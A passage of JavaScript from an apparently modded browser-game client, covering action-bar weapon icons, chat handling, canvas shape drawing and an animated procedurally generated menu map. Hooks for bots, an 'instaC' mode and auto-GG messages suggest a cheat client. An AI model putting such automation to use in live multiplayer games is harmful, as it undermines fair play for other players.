        }, 400);
        break;
      case "minus":
        sendChat("Minus Client | GG ");
        setTimeout(() => {
          sendChat("By Minus v2");
        }, 1500);
        break;
      case "revelation":
        sendChat("Revelation on top!");
        break;
      case "disabled":
      default:
        break;
    }
  }
}

function updateItems(data, wpn) {
  if (data) {
    if (wpn) {
      if (player.weapons[0] !== data[0]) {
        player.primaryVariant = 0;
        for (let key in weaponVariantCache) delete weaponVariantCache[key];
      }
      if (player.weapons[1] !== data[1]) {
        player.secondaryVariant = 0;
        for (let key in weaponVariantCache) delete weaponVariantCache[key];
      }
      player.weapons = data;
      player.primaryIndex = player.weapons[0];
      player.secondaryIndex = player.weapons[1];
      if (!instaC.isTrue) {
        selectWeapon(player.weapons[0]);
      }
    } else {
      player.items = data;
    }
  }

  for (let i = 0; i < items.list.length; i++) {
    let tmpI = items.weapons.length + i;
    let actionBarItem = getEl("actionBarItem" + tmpI);
    actionBarItem.style.display =
      player.items.indexOf(items.list[i].id) >= 0 ? "inline-block" : "none";
  }

  for (let i = 0; i < items.weapons.length; i++) {
    let actionBarItem = getEl("actionBarItem" + i);
    actionBarItem.style.display =
      player.weapons[items.weapons[i].type] == items.weapons[i].id
        ? "inline-block"
        : "none";
  }

  let kms = player.weapons[0] == 3 && player.weapons[1] == 15;
  if (kms) {
    getEl("actionBarItem3").style.display = "none";
    getEl("actionBarItem4").style.display = "inline-block";
  }

  updateWeaponVariantIndicators();
}

const weaponVariantCache = {};

function drawWeaponIcon(id, imgSrc, rot = Math.PI + Math.PI / 4) {
  const el = getEl(id);
  if (!el) return;

  const c = Object.assign(document.createElement("canvas"), {
    width: 66,
    height: 66,
  });
  const ctx = c.getContext("2d");
  ctx.translate(33, 33);
  ctx.rotate(rot);
  ctx.imageSmoothingEnabled = false;

  const img = new Image();
  img.crossOrigin = "anonymous";
  img.onload = () => {
    const i = parseInt(id.match(/\d+$/)[0]);
    const weapon = items.weapons[i];
    const pad = (weapon?.iPad || 1) * config.iconPad;
    const scale = img.width / img.height || 1;
    ctx.drawImage(
      img,
      -33 * pad * scale,
      -33 * pad,
      66 * pad * scale,
      66 * pad,
    );
    ctx.globalCompositeOperation = "source-atop";
    ctx.fillStyle = "rgba(0,0,70,.1)";
    ctx.fillRect(-33, -33, 66, 66);
    el.style.backgroundImage = `url(${c.toDataURL()})`;
  };
  img.src = imgSrc;
}

function updateWeaponVariantIndicators() {
  if (!player || !player.weapons) return;

  for (let i = 0; i < items.weapons.length; i++) {
    const weapon = items.weapons[i];
    if (!weapon) continue;

    const isEquipped = player.weapons[weapon.type] === weapon.id;
    if (!isEquipped) continue;

    const variant =
      weapon.type === 0
        ? player.primaryVariant || 0
        : player.secondaryVariant || 0;

    const variantSrc = config.weaponVariants[variant]?.src || "";
    const cacheKey = weapon.src + variantSrc;

    if (weaponVariantCache[i] === cacheKey) continue;
    weaponVariantCache[i] = cacheKey;
    if (variant === 0) {
      drawWeaponIcon("actionBarItem" + i, `./img/weapons/${weapon.src}.png`);
      continue;
    }

    const textureKey = weapon.src + variantSrc;
    const textureUrl = PackTextures.weapons[textureKey];

    if (!textureUrl) continue;

    drawWeaponIcon("actionBarItem" + i, textureUrl);
  }
}

function addProjectile(x, y, dir, range, speed, indx, layer, sid) {
  projectileManager.addProjectile(
    x,
    y,
    dir,
    range,
    speed,
    indx,
    null,
    null,
    layer,
    inWindow,
  ).sid = sid;
  runAtNextTick.push(Array.prototype.slice.call(arguments));
}

function remProjectile(sid, range) {
  for (let i = 0; i < projectiles.length; ++i) {
    if (projectiles[i].sid == sid) {
      projectiles[i].range = range;
      let tmpObjects = objectManager.hitObj;
      objectManager.hitObj = [];
      game.tickBase(() => {
        let val = projectiles[i].dmg;
        tmpObjects.forEach((healthy) => {
          if (healthy.projDmg) {
            healthy.health -= val;
          }
        });
      }, 1);
    }
  }
}

function setPlayerTeam(team, isOwner) {
  if (player) {
    player.team = team;
    player.isOwner = isOwner;
    if (team == null) alliancePlayers = [];
  }
}

function setAlliancePlayers(data) {
  alliancePlayers = data;
}

function updateStoreItems(type, id, index) {
  if (index) {
    if (!type) player.tails[id] = 1;
    else {
      player.latestTail = id;
    }
  } else {
    if (!type) ((player.skins[id] = 1), id == 7 && (my.reSync = true));
    else {
      player.latestSkin = id;
    }
  }
}

function toggleChat() {
  if (!usingTouch) {
    if (chatHolder.style.display == "block") {
      if (chatBox.value) {
        sendChat(chatBox.value);
      }
      closeChat();
    } else {
      storeMenu.style.display = "none";
      allianceMenu.style.display = "none";
      chatHolder.style.display = "block";
      chatBox.focus();
      resetMoveDir();
    }
  } else {
    setTimeout(function () {
      var chatMessage = prompt("chat message");
      if (chatMessage) {
        sendChat(chatMessage);
      }
    }, 1);
  }
  chatBox.value = "";
}
function receiveChat(sid, message) {
  let tmpPlayer = findPlayerBySID(sid);
  if (!tmpPlayer) return;

  tmpPlayer.chatMessage = message;
  tmpPlayer.chatCountdown = config.chatCountdown;

  function isAutoGG(message) {
    return (
      message.startsWith("AutoGG |") ||
      message === "Robotis winn" ||
      message === "Frozen client v3" ||
      message === "I'm Super Pro" ||
      message === "<[GG]>x-RedDragon Client<[GG]>" ||
      message === "BOOM! ZAKAT mod v2" ||
      message === "Auto-GG Project Cube v2" ||
      message === "Well Done XDD" ||
      message === "gg - AutoGG Happymod" ||
      message === "Happy Mod v7" ||
      message === "Made by Happymod" ||
      message === "Subscribe to Happymod" ||
      message === "Minus Client | GG" ||
      message === "By Minus v2" ||
      message === "Revelation on top!"
    );
  }

  if (
    (isAutoGG(message) && sid === player.sid) ||
    bottics.some((b) => b.Bot?.sid === sid)
  )
    return;

  AB.Chats.add(
    tmpPlayer.name + ": " + message,
    (!tmpPlayer.team && tmpPlayer != player) ||
      (tmpPlayer.team != player.team && tmpPlayer != player)
      ? "#cc5151"
      : tmpPlayer.team == player.team && tmpPlayer != player
        ? "#8ecc51"
        : "#fff",
  );
}

function closeChat() {
  chatBox.value = "";
  chatHolder.style.display = "none";
}

function updateMinimap(data) {
  minimapData = data;
}

function showText(x, y, value, color) {
  if (value === 0) return;

  const text = String(value);

  const displayColor = color || "#ffffff";

  textManager.showText(x, y, 45, 0.1, 1000, text, displayColor);
}

let tracker = {
  draw3: {
    active: false,
    x: 0,
    y: 0,
    scale: 0,
  },
  moveDir: undefined,
  lastPos: {
    x: 0,
    y: 0,
  },
};

const PI2 = Math.PI * 2;
const HALF_PI = Math.PI / 2;
const SQRT3_DIV2 = Math.sqrt(3) / 2;

function renderLeaf(x, y, l, r, ctxt) {
  const cosR = Math.cos(r);
  const sinR = Math.sin(r);
  const endX = x + l * cosR;
  const endY = y + l * sinR;
  const width = l * 0.4;
  const midX = (x + endX) * 0.5;
  const midY = (y + endY) * 0.5;
  const rPlusHalfPi = r + HALF_PI;
  const cosOffset = width * Math.cos(rPlusHalfPi);
  const sinOffset = width * Math.sin(rPlusHalfPi);

  ctxt.beginPath();
  ctxt.moveTo(x, y);
  ctxt.quadraticCurveTo(midX + cosOffset, midY + sinOffset, endX, endY);
  ctxt.quadraticCurveTo(midX - cosOffset, midY - sinOffset, x, y);
  ctxt.closePath();
  ctxt.fill();
  ctxt.stroke();
}

function renderCircle(x, y, scale, tmpContext, dontStroke, dontFill) {
  tmpContext = tmpContext || mainContext;
  tmpContext.beginPath();
  tmpContext.arc(x, y, scale, 0, PI2);
  if (!dontFill) tmpContext.fill();
  if (!dontStroke) tmpContext.stroke();
}

const renderHealthCircle = renderCircle;

function renderStar(ctxt, spikes, outer, inner) {
  const step = Math.PI / spikes;
  let rot = Math.PI * 1.5;

  ctxt.beginPath();
  ctxt.moveTo(0, -outer);

  for (let i = 0; i < spikes; i++) {
    ctxt.lineTo(Math.cos(rot) * outer, Math.sin(rot) * outer);
    rot += step;
    ctxt.lineTo(Math.cos(rot) * inner, Math.sin(rot) * inner);
    rot += step;
  }

  ctxt.lineTo(0, -outer);
  ctxt.closePath();
}

const renderHealthStar = renderStar;

function renderRect(x, y, w, h, ctxt, dontStroke, dontFill) {
  const halfW = w * 0.5;
  const halfH = h * 0.5;
  const rectX = x - halfW;
  const rectY = y - halfH;

  if (!dontFill) ctxt.fillRect(rectX, rectY, w, h);
  if (!dontStroke) ctxt.strokeRect(rectX, rectY, w, h);
}

const renderHealthRect = renderRect;

function renderRectCircle(x, y, s, sw, seg, ctxt, dontStroke, dontFill) {
  ctxt.save();
  ctxt.translate(x, y);
  seg = Math.ceil(seg * 0.5);
  const rotStep = Math.PI / seg;

  for (let i = 0; i < seg; i++) {
    renderRect(0, 0, s * 2, sw, ctxt, dontStroke, dontFill);
    ctxt.rotate(rotStep);
  }
  ctxt.restore();
}

function renderBlob(ctxt, spikes, outer, inner) {
  let rot = Math.PI * 1.5;
  const step = Math.PI / spikes;
  const doubleStep = step * 2;

  ctxt.beginPath();
  ctxt.moveTo(0, -inner);

  for (let i = 0; i < spikes; i++) {
    const tmpOuter = UTILS.randInt(outer + 0.9, outer * 1.2);
    const nextRot = rot + step;
    const nextNextRot = rot + doubleStep;

    ctxt.quadraticCurveTo(
      Math.cos(nextRot) * tmpOuter,
      Math.sin(nextRot) * tmpOuter,
      Math.cos(nextNextRot) * inner,
      Math.sin(nextNextRot) * inner,
    );
    rot = nextNextRot;
  }

  ctxt.lineTo(0, -inner);
  ctxt.closePath();
}

function renderTriangle(s, ctx) {
  ctx = ctx || mainContext;
  const h = s * SQRT3_DIV2;
  const halfS = s * 0.5;
  const halfH = h * 0.5;

  ctx.beginPath();
  ctx.moveTo(0, -halfH);
  ctx.lineTo(-halfS, halfH);
  ctx.lineTo(halfS, halfH);
  ctx.lineTo(0, -halfH);
  ctx.fill();
  ctx.closePath();
}

function renderPolygon(ctx, sides, diameter) {
  let lineWidth = ctx.lineWidth || 0;
  let radius = diameter / 2;
  ctx.beginPath();
  let angles = (Math.PI * 2) / sides;
  for (let index = 0; index < sides; index++) {
    let x = radius + (radius - lineWidth / 2) * Math.cos(angles * index);
    let y = radius + (radius - lineWidth / 2) * Math.sin(angles * index);
    ctx.lineTo(x, y);
  }
  ctx.closePath();
}

const menuBackground = {
  initialized: false,
  objects: [],
  buildings: [],
  camX: 0,
  camY: 0,
  targetCamX: 0,
  targetCamY: 0,
  startCamX: 0,
  startCamY: 0,
  camTimer: 0,
  camDuration: 15000,
  zoom: 1,
  targetZoom: 1,
  zoomSmooth: 0.12,
  minZoom: 0.1,
  dragging: false,
  keys: { w: false, a: false, s: false, d: false },
  moveSpeed: 800,
  dragStartX: 0,
  dragStartY: 0,
  dragCamStartX: 0,
  dragCamStartY: 0,

  onMouseDown(e) {
    if (e.button === 1 && !inGame) {
      e.preventDefault();
      this.dragging = true;
      this.dragStartX = e.clientX;
      this.dragStartY = e.clientY;
      this.dragCamStartX = this.camX;
      this.dragCamStartY = this.camY;
    }
  },

  onMouseMove(e) {
    if (this.dragging && !inGame) {
      const scale = Math.max(
        screenWidth / maxScreenWidth,
        screenHeight / maxScreenHeight,
      );
      const dx = (e.clientX - this.dragStartX) / scale;
      const dy = (e.clientY - this.dragStartY) / scale;
      this.camX = this.dragCamStartX - dx;
      this.camY = this.dragCamStartY - dy;
      const mapScale = config?.mapScale || 14400;
      const border = 1000;
      this.camX = Math.max(-border, Math.min(mapScale + border, this.camX));
      this.camY = Math.max(-border, Math.min(mapScale + border, this.camY));
      this.targetCamX = this.camX;
      this.targetCamY = this.camY;
      this.startCamX = this.camX;
      this.startCamY = this.camY;
      this.camTimer = 0;
    }
  },

  onMouseUp(e) {
    if (e.button === 1) {
      this.dragging = false;
    }
  },

  onWheel(e) {
    if (e.shiftKey && !inGame) {
      e.preventDefault();
      const delta = e.deltaY > 0 ? -0.15 : 0.15;
      this.targetZoom = Math.max(this.minZoom, this.targetZoom + delta);
    }
  },

  onKeyDown(e) {
    if (e.shiftKey && !inGame) {
      const key = e.key.toLowerCase();
      if (key === "w" || key === "a" || key === "s" || key === "d") {
        this.keys[key] = true;
      }
    }
  },

  onKeyUp(e) {
    if (!e.key) return;
    const key = e.key.toLowerCase();
    if (key === "w" || key === "a" || key === "s" || key === "d") {
      this.keys[key] = false;
    }
  },

  bindEvents() {
    document.addEventListener("mousedown", (e) => this.onMouseDown(e));
    document.addEventListener("mousemove", (e) => this.onMouseMove(e));
    document.addEventListener("mouseup", (e) => this.onMouseUp(e));
    document.addEventListener("wheel", (e) => this.onWheel(e), {
      passive: false,
    });
    document.addEventListener("keydown", (e) => this.onKeyDown(e));
    document.addEventListener("keyup", (e) => this.onKeyUp(e));
    document.addEventListener("contextmenu", (e) => {
      if (this.dragging) e.preventDefault();
    });
  },

  init() {
    if (this.initialized) return;
    this.initialized = true;
    this.generateMap();
    this.generateBuildings();
    this.pickRandomPosition(true);
  },

  automillSpawns: [],

  pickRandomPosition(immediate) {
    this.startCamX = this.camX;
    this.startCamY = this.camY;

    if (this.automillSpawns.length > 0) {
      const spawn =
        this.automillSpawns[
        Math.floor(Math.random() * this.automillSpawns.length)
        ];
      this.targetCamX = spawn.x;
      this.targetCamY = spawn.y;
    } else {
      const mapScale = config?.mapScale || 14400;
      this.targetCamX = 1000 + Math.random() * (mapScale - 2000);
      this.targetCamY = 1000 + Math.random() * (mapScale - 2000);
    }

    if (immediate) {
      this.camX = this.targetCamX;
      this.camY = this.targetCamY;
      this.startCamX = this.targetCamX;
      this.startCamY = this.targetCamY;
    }
    this.camTimer = 0;
  },

  checkCollision(x, y, scale, ...lists) {
    for (const list of lists) {
      for (const obj of list) {
        const dx = obj.x - x;
        const dy = obj.y - y;
        const minDist = (obj.scale || 50) + scale + 15;
        if (dx * dx + dy * dy < minDist * minDist) return true;
      }
    }
    return false;
  },

  generateBuildings() {
    this.buildings = [];
    const mapScale = config?.mapScale || 14400;
    const snowTop = config?.snowBiomeTop || 2400;
    const riverWidth = config?.riverWidth || 724;
    const riverMin = mapScale / 2 - riverWidth / 2;
    const riverMax = mapScale / 2 + riverWidth / 2;

    const buildingTypes = [
      { id: 6, scale: 49, name: "spikes", layer: 0 },
      { id: 7, scale: 52, name: "greater spikes", layer: 0 },
      { id: 8, scale: 52, name: "poison spikes", layer: 0 },
      { id: 3, scale: 50, name: "wood wall", layer: 0 },
      { id: 4, scale: 50, name: "stone wall", layer: 0 },
      { id: 5, scale: 52, name: "castle wall", layer: 0 },
      { id: 10, scale: 45, name: "windmill", layer: 1 },
      { id: 11, scale: 47, name: "faster windmill", layer: 1 },
      { id: 16, scale: 45, name: "boost pad", layer: -1 },
      { id: 17, scale: 43, name: "turret", layer: 1 },
      { id: 15, scale: 50, name: "pit trap", layer: -1, alpha: 0.6 },
      { id: 18, scale: 43, name: "platform", layer: 1, canRiver: true },
    ];

    this.automillSpawns = [];

    const simAutoMill = (simPlayer, lastMill, buildings, objects) => {
      const playerScale = 35;
      const millItem = simPlayer.millType;
      const W2 = 1.13;
      const tmpScale =
        playerScale + millItem.scale + (millItem.placeOffset || 0);
      const angles = [
        simPlayer.dir + Math.PI,
        simPlayer.dir + Math.PI - W2,
        simPlayer.dir + Math.PI + W2,
      ];

      const dx = simPlayer.x - lastMill.x;
      const dy = simPlayer.y - lastMill.y;
      const dist = Math.sqrt(dx * dx + dy * dy);

      if (dist < 90) return false;

      const millPositions = [];
      let allValid = true;

      for (const angle of angles) {
        const millX = simPlayer.x + tmpScale * Math.cos(angle);
        const millY = simPlayer.y + tmpScale * Math.sin(angle);

        if (
          millX < 200 ||
          millX > mapScale - 200 ||
          millY < snowTop + 100 ||
          millY > mapScale - snowTop - 100
        ) {
          allValid = false;
          break;
        }

        if (millY >= riverMin && millY <= riverMax) {
          allValid = false;
          break;
        }

        if (
          this.checkCollision(millX, millY, millItem.scale, buildings, objects)
        ) {
          allValid = false;
          break;
        }

        millPositions.push({ x: millX, y: millY, angle });
      }

      if (!allValid || millPositions.length !== 3) return false;

      for (const pos of millPositions) {
        buildings.push({
          sid: buildings.length,
          x: pos.x,
          y: pos.y,
          dir: Math.random() * Math.PI * 2,
          id: millItem.id,
          scale: millItem.scale,
          name: millItem.name,
          group: { layer: 1 },
          isItem: true,
          active: true,
          alpha: 1,
          xWiggle: 0,
          yWiggle: 0,
          layer: 1,
        });
      }

      lastMill.x = simPlayer.x;
      lastMill.y = simPlayer.y;
      return true;
    };

    const automillTrailCount = 4 + Math.floor(Math.random() * 3);
    for (let t = 0; t < automillTrailCount; t++) {
      const forestTop = snowTop + 400;
      const forestBot = mapScale - snowTop - 400;
      const riverCenter = mapScale / 2;
      const riverHalf = riverWidth / 2 + 200;

      let startX = 1500 + Math.random() * (mapScale - 3000);
      let startY =
        Math.random() < 0.5
          ? forestTop +
          Math.random() * (riverCenter - riverHalf - forestTop - 200)
          : riverCenter +
          riverHalf +
          Math.random() * (forestBot - riverCenter - riverHalf - 200);

      const simPlayer = {
        x: startX,
        y: startY,
        dir: Math.random() * Math.PI * 2,
        millType:
          Math.random() < 0.6
            ? { id: 10, scale: 45, name: "windmill", placeOffset: 0 }
            : { id: 11, scale: 47, name: "faster windmill", placeOffset: 0 },
      };

      const lastMill = { x: simPlayer.x, y: simPlayer.y };
      const pathLength = 12 + Math.floor(Math.random() * 16);
      const moveSpeed = 8;
      let placedCount = 0;

      for (let step = 0; step < pathLength * 12; step++) {
        if (simAutoMill(simPlayer, lastMill, this.buildings, this.objects)) {
          placedCount++;
          if (placedCount === Math.floor(pathLength / 2)) {
            this.automillSpawns.push({ x: simPlayer.x, y: simPlayer.y });
          }
        }

        simPlayer.x += Math.cos(simPlayer.dir) * moveSpeed;
        simPlayer.y += Math.sin(simPlayer.dir) * moveSpeed;

        if (step % 8 === 0) {
          simPlayer.dir += (Math.random() - 0.5) * 0.4;
        }

        if (simPlayer.x < 800 || simPlayer.x > mapScale - 800) {
          simPlayer.dir = Math.PI - simPlayer.dir;
        }
        if (
          simPlayer.y < snowTop + 300 ||
          simPlayer.y > mapScale - snowTop - 300
        ) {
          simPlayer.dir = -simPlayer.dir;
        }
        if (
          (simPlayer.y < riverMin &&
            simPlayer.y + Math.sin(simPlayer.dir) * moveSpeed * 10 >=
            riverMin) ||
          (simPlayer.y > riverMax &&
            simPlayer.y + Math.sin(simPlayer.dir) * moveSpeed * 10 <= riverMax)
        ) {
          simPlayer.dir = -simPlayer.dir;
        }
      }
    }

    const clusterCount = 6;
    for (let c = 0; c < clusterCount; c++) {
      const cx = 2000 + Math.random() * (mapScale - 4000);
      const cy =
        snowTop + 800 + Math.random() * (mapScale - snowTop * 2 - 1600);
      const buildingCount = 10 + Math.floor(Math.random() * 12);

      for (let i = 0; i < buildingCount; i++) {
        const bType =
          buildingTypes[Math.floor(Math.random() * buildingTypes.length)];
        const scale = bType.scale;

        let x,
          y,
          attempts = 0;
        do {
          const angle = Math.random() * Math.PI * 2;
          const dist = 60 + Math.random() * 350;
          x = cx + Math.cos(angle) * dist;
          y = cy + Math.sin(angle) * dist;
          attempts++;
        } while (
          (this.checkCollision(x, y, scale, this.buildings, this.objects) ||
            (!bType.canRiver && y >= riverMin && y <= riverMax)) &&
          attempts < 20
        );

        if (attempts >= 20) continue;

        this.buildings.push({
          sid: this.buildings.length,
          x,
          y,
          dir: Math.random() * Math.PI * 2,
          id: bType.id,
          scale,
          name: bType.name,
          group: { layer: bType.layer },
          isItem: true,
          active: true,
          alpha: bType.alpha || 1,
          xWiggle: 0,
          yWiggle: 0,
          layer: bType.layer,
        });
      }
    }

    this.buildings.sort((a, b) => a.y - b.y);
  },

  generateMap() {
    this.objects = [];
    const mapScale = config?.mapScale || 14400;
    const snowTop = config?.snowBiomeTop || 2400;
    const riverWidth = config?.riverWidth || 724;
    const riverMin = mapScale / 2 - riverWidth / 2;
    const riverMax = mapScale / 2 + riverWidth / 2;

    const objectCount = 180;

    for (let i = 0; i < objectCount; i++) {
      const isDesert = Math.random() < 0.33;
      const isSnow = !isDesert && Math.random() < 0.5;

      let x,
        y,
        type,
        scale,
        attempts = 0;

      const typeRand = Math.random();
      if (isDesert) {
        if (typeRand < 0.7) {
          type = 1;
          scale = 110;
        } else if (typeRand < 0.9) {
          type = 2;
          scale = 120;
        } else {
          type = 3;
          scale = 115;
        }
      } else {
        if (typeRand < 0.35) {
          type = 0;
          scale = 140;
        } else if (typeRand < 0.6) {
          type = 1;
          scale = 110;
        } else if (typeRand < 0.85) {
          type = 2;
          scale = 120;
        } else {
          type = 3;
          scale = 115;
        }
      }

      do {
        x = 200 + Math.random() * (mapScale - 400);
        if (isDesert) {
          y = mapScale - snowTop + 200 + Math.random() * (snowTop - 400);
        } else if (isSnow) {
          y = 200 + Math.random() * (snowTop - 400);
        } else {
          y = snowTop + 200 + Math.random() * (mapScale - snowTop * 2 - 400);
          const inRiver = y >= riverMin && y <= riverMax;
          if (inRiver && type !== 2) {
            y =
              Math.random() < 0.5
                ? riverMin - 150 - Math.random() * 300
                : riverMax + 150 + Math.random() * 300;
          }
        }
        attempts++;
      } while (
        this.checkCollision(x, y, scale, this.objects, this.buildings) &&
        attempts < 15
      );

      if (attempts >= 15) continue;

      this.objects.push({
        x,
        y,
        type,
        scale,
        active: true,
        render: true,
        xWiggle: 0,
        yWiggle: 0,
        dir: Math.random() * Math.PI * 2,
        alpha: 1,
        layer: type === 0 ? 3 : type === 2 ? 0 : 2,
      });
    }

    this.objects.sort((a, b) => a.y - b.y);
  },

  update(delta) {
    if (!config) return;
    if (!this.initialized) this.init();

    if (Math.abs(this.zoom - this.targetZoom) > 0.001) {
      this.zoom += (this.targetZoom - this.zoom) * this.zoomSmooth;
    }

    const mapScale = config?.mapScale || 14400;

    const isMoving = this.keys.w || this.keys.a || this.keys.s || this.keys.d;
    if (isMoving) {
      const speed = (this.moveSpeed * delta) / 1000 / this.zoom;
      if (this.keys.w) this.camY -= speed;
      if (this.keys.s) this.camY += speed;
      if (this.keys.a) this.camX -= speed;
      if (this.keys.d) this.camX += speed;
      const border = 1000;
      this.camX = Math.max(-border, Math.min(mapScale + border, this.camX));
      this.camY = Math.max(-border, Math.min(mapScale + border, this.camY));
      this.targetCamX = this.camX;
      this.targetCamY = this.camY;
      this.startCamX = this.camX;
      this.startCamY = this.camY;
      this.camTimer = 0;
      return;
    }

    if (this.dragging) return;

    this.camTimer += delta;
    const progress = Math.min(1, this.camTimer / this.camDuration);
    const ease =
      progress < 0.5
        ? 2 * progress * progress
        : 1 - Math.pow(-2 * progress + 2, 2) / 2;

    this.camX = this.startCamX + (this.targetCamX - this.startCamX) * ease;
    this.camY = this.startCamY + (this.targetCamY - this.startCamY) * ease;

    if (this.camTimer >= this.camDuration) {
      this.pickRandomPosition(false);
    }

    const t = performance.now() * 0.0005;
    this.camX += Math.sin(t) * 0.8;
    this.camY += Math.cos(t * 0.7) * 0.8;
  },

  render(ctx) {
    if (!this.initialized || !config) return;

    const mapScale = config.mapScale;
    const snowTop = config.snowBiomeTop;
    const viewW = maxScreenWidth / this.zoom;
    const viewH = maxScreenHeight / this.zoom;
    const xOffset = this.camX - viewW / 2;
    const yOffset = this.camY - viewH / 2;

    ctx.beginPath();
    ctx.clearRect(0, 0, maxScreenWidth, maxScreenHeight);
    ctx.globalAlpha = 1;

    ctx.save();
    ctx.scale(this.zoom, this.zoom);

    if (snowTop - yOffset <= 0 && mapScale - snowTop - yOffset >= viewH) {
      ctx.fillStyle = "#b6db66";
      ctx.fillRect(0, 0, viewW, viewH);
    } else if (mapScale - snowTop - yOffset <= 0) {
      ctx.fillStyle = "#dbc666";
      ctx.fillRect(0, 0, viewW, viewH);
    } else if (snowTop - yOffset >= viewH) {
      ctx.fillStyle = "#fff";
      ctx.fillRect(0, 0, viewW, viewH);
    } else if (snowTop - yOffset >= 0) {
      ctx.fillStyle = "#fff";
      ctx.fillRect(0, 0, viewW, snowTop - yOffset);
      ctx.fillStyle = "#b6db66";
      ctx.fillRect(0, snowTop - yOffset, viewW, viewH - (snowTop - yOffset));
      snowPath.render("#fff", xOffset, yOffset);
    } else {
      ctx.fillStyle = "#b6db66";
      ctx.fillRect(0, 0, viewW, mapScale - snowTop - yOffset);
      ctx.fillStyle = "#dbc666";
      ctx.fillRect(
        0,
        mapScale - snowTop - yOffset,
        viewW,
        viewH - (mapScale - snowTop - yOffset),
      );
      desertPath.render("#b6db66", xOffset, yOffset);
    }

    ctx.globalAlpha = 1;
    ctx.fillStyle = "#dbc666";
    const tmpW1 = config.riverWidth + config.riverPadding;
    const tmpY1 = mapScale / 2 - yOffset - tmpW1 / 2;
    if (tmpY1 < viewH && tmpY1 + tmpW1 > 0) {
      ctx.fillRect(0, tmpY1, viewW, tmpW1);
    }
    ctx.fillStyle = "#91b2db";
    const tmpW2 = config.riverWidth;
    const tmpY2 = mapScale / 2 - yOffset - tmpW2 / 2;
    if (tmpY2 < viewH && tmpY2 + tmpW2 > 0) {
      ctx.fillRect(0, tmpY2, viewW, tmpW2);
    }

    ctx.globalAlpha = 1;
    ctx.strokeStyle = outlineColor;
    ctx.lineWidth = outlineWidth;

    for (const obj of this.objects) {
      const screenX = obj.x - xOffset;
      const screenY = obj.y - yOffset;
      if (
        screenX < -200 ||
        screenX > viewW + 200 ||
        screenY < -200 ||
        screenY > viewH + 200
      )
        continue;

      const sprite = getResSprite(obj);
      ctx.globalAlpha = obj.alpha;
      ctx.drawImage(
        sprite,
        screenX - sprite.width / 2,
        screenY - sprite.height / 2,
      );
    }

    for (const bld of this.buildings) {
      const screenX = bld.x - xOffset;
      const screenY = bld.y - yOffset;
      if (
        screenX < -200 ||
        screenX > viewW + 200 ||
        screenY < -200 ||
        screenY > viewH + 200
      )
        continue;

      try {
        const sprite = getItemSprite(bld);
        if (sprite) {
          ctx.save();
          ctx.translate(screenX, screenY);
          ctx.rotate(bld.dir);
          ctx.globalAlpha = bld.alpha;
          ctx.drawImage(sprite, -sprite.width / 2, -sprite.height / 2);
          ctx.restore();
        }
      } catch (e) { }
    }

    // Night rendering
    ctx.globalAlpha = 1;
    ctx.fillStyle = "rgba(0, 0, 70, 0.35)";
    ctx.fillRect(0, 0, viewW, viewH);
    ctx.globalAlpha = 0.35;
    ctx.fillStyle = "rgb(0, 0, 100)";
    ctx.fillRect(0, 0, viewW, viewH);

    ctx.fillStyle = "#000";
    ctx.globalAlpha = 0.09;
    if (xOffset <= 0) {
      ctx.fillRect(0, 0, -xOffset, viewH);
    }
    if (mapScale - xOffset <= viewW) {
      var tmpY = Math.max(0, -yOffset);
      ctx.fillRect(
        mapScale - xOffset,
        tmpY,
        viewW - (mapScale - xOffset),
        viewH - tmpY,
      );
    }
    if (yOffset <= 0) {
      ctx.fillRect(-xOffset, 0, viewW + xOffset, -yOffset);
    }
    if (mapScale - yOffset <= viewH) {
      var tmpX = Math.max(0, -xOffset);
      var tmpMin = 0;
      if (mapScale - xOffset <= viewW) {
        tmpMin = viewW - (mapScale - xOffset);
      }
      ctx.fillRect(
        tmpX,
        mapScale - yOffset,
        viewW - tmpX - tmpMin,
        viewH - (mapScale - yOffset),
      );
    }

    ctx.restore();
    ctx.globalAlpha = 1;
  },
};

function prepareMenuBackground() {
  menuBackground.init();
  menuBackground.bindEvents();
}

function renderDeadPlayers(xOffset, yOffset) {
  mainContext.fillStyle = "#91b2db";
  const currentTime = Date.now();
  deadPlayers
    .filter((dead) => dead.active)
    .forEach((dead) => {
      if (!dead.startTime) {
        dead.startTime = currentTime;
        dead.driftX = Math.random() * 0.8 - 0.4;
        dead.driftY = -2.5 - Math.random() * 1.5;
        dead.wobbleSpeed = 0.003 + Math.random() * 0.004;
        dead.wobbleAmount = 1 + Math.random() * 1;
        dead.wobbleOffset = Math.random() * Math.PI * 2;
        dead.spinSpeed = 0.003;
      }

      const timeElapsed = currentTime - dead.startTime;
      const maxAlpha = 0.7;

      if (timeElapsed < 1500) {
        dead.alpha = maxAlpha;
      } else {
        dead.alpha = Math.max(0, maxAlpha - (timeElapsed - 1500) / 1000);
      }

      const wobbleX =
        Math.sin(timeElapsed * dead.wobbleSpeed + dead.wobbleOffset) *
        dead.wobbleAmount;
      const wobbleY =
        Math.cos(timeElapsed * dead.wobbleSpeed * 1.3 + dead.wobbleOffset) *
        dead.wobbleAmount *
        0.7;

      dead.x += dead.driftX + wobbleX * 0.05;
      dead.y += dead.driftY + wobbleY * 0.05;

      mainContext.globalAlpha = dead.alpha;
      mainContext.strokeStyle = outlineColor;
      mainContext.save();

      mainContext.translate(dead.x - xOffset, dead.y - yOffset);
      mainContext.rotate(timeElapsed * dead.spinSpeed);

      renderDeadPlayer(dead, mainContext);

      mainContext.restore();
      mainContext.fillStyle = "#91b2db";

      if (timeElapsed >= 2500) {
        dead.active = false;
        dead.startTime = null;
      }
    });
}

function renderPlayers(xOffset, yOffset, zIndex) {
  mainContext.globalAlpha = 1;
  mainContext.fillStyle = "#91b2db";

  for (var i = 0; i < players.length; ++i) {
    tmpObj = players[i];
    if (tmpObj.zIndex == zIndex) {
      tmpObj.animate(delta);
      if (tmpObj.visible) {
        tmpObj.skinRot += 0.002 * delta;

        const playerX = tmpObj.x - xOffset;
        const playerY = tmpObj.y - yOffset;
        const baseDistance = Math.min(screenWidth, screenHeight) * 1.5;
        const dynamicRenderDistance = baseDistance * wbe;
        const distanceSquared =
          (playerX - screenWidth / 2) ** 2 + (playerY - screenHeight / 2) ** 2;
        const distance = Math.sqrt(distanceSquared);

        const fadeSpeed = 1 / 120;
        let fadeAlpha = 1;

        if (tmpObj.fadeAlpha === undefined) tmpObj.fadeAlpha = 0;

        if (distance > dynamicRenderDistance) {
          tmpObj.fadeAlpha = 0;
          continue;
        } else if (distance > dynamicRenderDistance - 200) {
          const fadeProgress = Math.max(
            0,
            (distance - (dynamicRenderDistance - 200)) / 200,
          );
          const targetAlpha = Math.max(0, 1 - fadeProgress);
          tmpObj.fadeAlpha = Math.max(
            targetAlpha,
